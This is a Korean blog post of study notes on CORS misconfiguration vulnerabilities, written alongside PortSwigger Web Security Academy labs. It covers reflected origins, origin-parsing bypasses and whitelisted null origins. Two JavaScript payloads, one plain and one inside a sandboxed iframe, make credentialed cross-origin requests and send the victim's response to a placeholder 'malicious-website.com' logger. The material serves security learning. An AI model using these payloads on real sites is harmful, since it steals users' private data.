---
layout: post
title: "Burp Academy-CORS 설명"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, CORS]
toc: true
last_modified_at: 2023-07-05 17:02:00 +0900
---


# CORS (cross-origin resource sharing)란?
- 웹 사이트의 리소스에 대한 접근을 컨트롤하는 브라우저 메커니즘이다. 
- 이는 동일출처정책(SOP)을 일부분 완화함으로써 가능하다. 이런 특성 때문에 잘못 구현하면 취약점을 만들어 내게 되므로 주의가 필요하다. 
- CORS는 CSRF공격에 대한 방어메커니즘이 아니다. 
- 참고로 동일출처 정책은 크로스 도메인간에 HTTP요청을 막는 것이 아니다. 대신에 HTTP 응답에 접근하는 것을 막는다. 

# 취약한 CORS 설정 패턴
## Server-generated ACAO header from client-specified Origin header
서버가 클라이언트가 보낸 Origin헤더를 무조건적으로 신뢰해서 ACAO (access-control-allow-origin)헤더에 해당 Origin을 설정해줌으로 인해,사실상 SOP가 없는 것과 마찬가지인 상태가 되는 취약점이다. 어떤 사이트에서도 이 사이트에 크로스 오리진 요청을 하고 결과에 접근할 수 있다.  

다음과 같은 코드를 실행하게 만들면 사용자의 중요정보를 탈취할 수 있다. 

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```

[관련 문제 풀이]({% post_url 2023-07-04-burp-academy-cors-1 %})

## Errors parsing Origin headers
서버가 클라이언트가 보낸 Origin 헤더의 값을 화이트리스트로 관리하고 있을 때, 도메인의 일부분만 매치하는 식으로 판단하게 되면, 이 로직을 우회할 수 있는 경우가 있다. 

예를들어 서버가 Origin헤더의 값에 normal-website.com 가 포함되어 있는지 판단한다고 했을 때, normal-website.com.evil-user.net 를 보내게 되면 우회할 수 있다. 

## Whitelisted null origin value
Origin헤더에 null을 보냈을 때, 서버가 ACAO헤더에 null을 회신해준다면 sandboxed iframe를 포함한 몇 가지 트릭으로 크로스 도메인 접근이 가능해지는 경우가 있다. 

Origin헤더에 null값이 설정되는 경우는 몇 가지가 있다. 

- 크로스 오리진 리다이렉트
- serialized 된 데이터로부터의 요청
- file: 프로토콜을 사용한 요청
- 샌드박스된 크로스 오리진 요청

서버가 ACAO헤더에 null을 회신해주는 경우, 크로스도메인 접근이 가능한 것 같다. (그래야만 이 취약점이 성립한다.) 이 부분은 별도로 테스트해서 실제 내 눈으로도 확인해두고 싶다. [여기]({% post_url 2023-07-05-cors-null-test %})에서 테스트했다. 

클라이언트는 다음과 같은 iframe을 사용해 Origin이 null인 요청을 보낼 수 있다. 

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

[여기](https://www.w3schools.com/tags/att_iframe_sandbox.asp)의 설명에 의하면 iframe에 sandbox 속성이 있으면 iframe의 컨텐츠를 유니크 오리진으로부터의 것으로 취급한다고 한다. 아마 이 특징이 `Origin: null` 이 전송되는 이유인 것 같다.

sandbox 속성은 본래는 iframe을 더 안전하게 사용하기 위해 여러가지 제약을 가하는 용도인 것 같다. sandbox 속성자체만 부여하면 여러가지 제약이 자동으로 가해지는데 그 중에서 허용하고 싶은 것은 추가로 지정해주는 형태다. 예를 들면 `allow-scripts`, `allow-forms`, `allow-modals`등이다. 이 외에도 여러가지 있다. 위의 코드는 `allow-scripts allow-top-navigation allow-forms`의 세 가지 액션을 허용해주고 있다. 각각 스크립트 실행, top-level browsing context에 접근 허용(아마 iframe을 포함하는 부모 HTML에 접근할 수 있다는 의미인 것 같다.), 폼 제출을 허용한다는 의미이다. 

[관련 문제 풀이]({% post_url 2023-07-04-burp-academy-cors-2 %})

## Exploiting XSS via CORS trust relationships
CORS 설정에 문제가 없다고 해도 신뢰하고 있는 사이트측에 XSS취약점이 있다면 그 사이트의 취약점으로 인해 인증정보가 누출되는 경우가 생긴다. 

## Breaking TLS with poorly configured CORS
서버가 HTTP프로토콜인 Origin헤더도 신뢰하는 경우, MITM공격으로 통신정보가 도청 및 변조되는 경우가 생길 수 있다. 

## Intranets and CORS without credentials
인트라넷의 중요 정보를 제공하는 서버의 CORS 설정이 Wildcard로 되어 있고, IP제한으로 보호하고 있는 경우 (사내인트라넷 IP라면 액세스 가능한 경우), 인터넷상의 유저를 XSS로 공격하는 것으로 인트라넷의 중요 정보가 누출될 수 있다. 


# 참고 
- https://portswigger.net/web-security/cors
- https://www.w3schools.com/tags/att_iframe_sandbox.asp
- https://qiita.com/mzmz__02/items/f1187e86c175de5aec0b